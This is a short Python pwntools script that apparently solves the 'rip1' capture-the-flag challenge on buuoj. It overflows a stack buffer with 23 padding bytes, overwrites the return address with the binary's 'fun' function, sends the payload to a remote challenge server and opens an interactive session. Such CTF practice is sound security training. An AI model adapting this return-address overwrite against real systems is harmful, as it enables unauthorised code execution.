from pwn import *


def rip1(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/rip1'):
    print('rip1 start')
    context(log_level='debug', arch='amd64', os='linux')

    target = process([file_name])
    target = remote('node4.buuoj.cn', 25462)
    target_elf = ELF(file_name)

    fun_ptr = target_elf.symbols['fun']

    payload = b'A' * (15 + 8) + p64(fun_ptr + 1)
    target.sendline(payload)

    # gdb.attach(target)

    target.interactive()
    print('rip1 end')


if __name__ == '__main__':
    rip1()
